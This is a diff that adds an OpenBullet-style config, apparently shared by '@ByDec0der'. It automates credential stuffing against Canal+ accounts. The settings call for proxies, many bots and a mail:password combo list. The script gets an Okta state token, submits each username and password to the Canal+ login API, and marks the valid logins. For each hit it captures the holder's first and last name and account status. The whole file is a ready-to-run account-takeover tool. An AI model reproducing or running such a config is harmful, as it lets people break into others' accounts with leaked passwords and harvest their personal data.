@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "MyCanal Ios",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-28T18:05:06.2286995+02:00",
+  "AdditionalInfo": "",
+  "Author": "@ByDec0der",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://pass.canalplus.com/oauth2/default/v1/authorize?client_id=0oa7mop7kI79jDOCA416&redirect_uri=https%3A%2F%2Fpass.canal-plus.com%2Fprovider%2Foauth2sp%2Fauth%2FCPOKT&response_type=code&scope=profile+openid+email+address+phone+offline_access&state=redirect_uri%3Dhttps%253A%252F%252Faccount.canalplus.com%252Fgm%252Fmobile%252Foauth%26platform%3DPC" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://pass.canalplus.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Okta-User-Agent-Extended: okta-signin-widget-4.5.2" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept-Language: tr" 
+  HEADER "Content-Length: 191" 
+  HEADER "Connection: close" 
+
+PARSE "<SOURCE>" LR "\"stateToken\":\"" "\"" -> VAR "tok" 
+
+REQUEST POST "https://pass.canalplus.com/api/v1/authn" 
+  CONTENT "{\"password\":\"<PASS>\",\"username\":\"<USER>\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true},\"stateToken\":\"<tok>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://pass.canalplus.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Okta-User-Agent-Extended: okta-signin-widget-4.5.2" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept-Language: tr" 
+  HEADER "Content-Length: 191" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"SUCCESS\"," 
+  KEYCHAIN Failure OR 
+    KEY "E0000004" 
+  KEYCHAIN Retry OR 
+    KEY "\":\"Ä°stek gÃ¶vdesi iyi oluÅŸturulmamÄ±ÅŸtÄ±" 
+
+#USHER_NAME PARSE "<SOURCE>" LR "firstName\":\"" "\"" CreateEmpty=FALSE -> CAP "First Name" 
+
+#LAST_NAME PARSE "<SOURCE>" LR "\"lastName\":\"" "\"" CreateEmpty=FALSE -> CAP "Last Name" 
+
+#STATUS PARSE "<SOURCE>" LR "\"status\":\"" "\"" CreateEmpty=FALSE -> CAP "Status" 
+
+FUNCTION Constant "Premium" -> CAP "Plan" 
+
+FUNCTION Constant "@ByDec0der" -> CAP "Made By" 
+
+
+
